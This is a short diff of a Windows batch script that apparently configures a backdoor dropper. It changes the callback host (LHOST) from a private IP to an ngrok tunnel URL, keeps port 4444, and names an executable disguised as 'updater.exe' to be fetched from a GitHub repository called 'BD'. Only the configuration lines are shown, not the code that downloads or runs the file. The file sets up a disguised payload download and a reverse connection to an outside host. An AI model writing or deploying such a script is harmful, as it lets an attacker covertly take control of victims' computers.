@@ -8,7 +8,7 @@
 setlocal enableDelayedExpansion
 
 REM Change these to your server's IP and file location
-set LHOST=10.221.71.84
+set LHOST=https://4cb8-84-241-158-70.ngrok-free.app/
 set LPORT=4444
 set FILENAME=updater.exe
 set FILEURL=https://github.com/H4ck3r-netizen/BD/raw/refs/heads/main/updater.exe
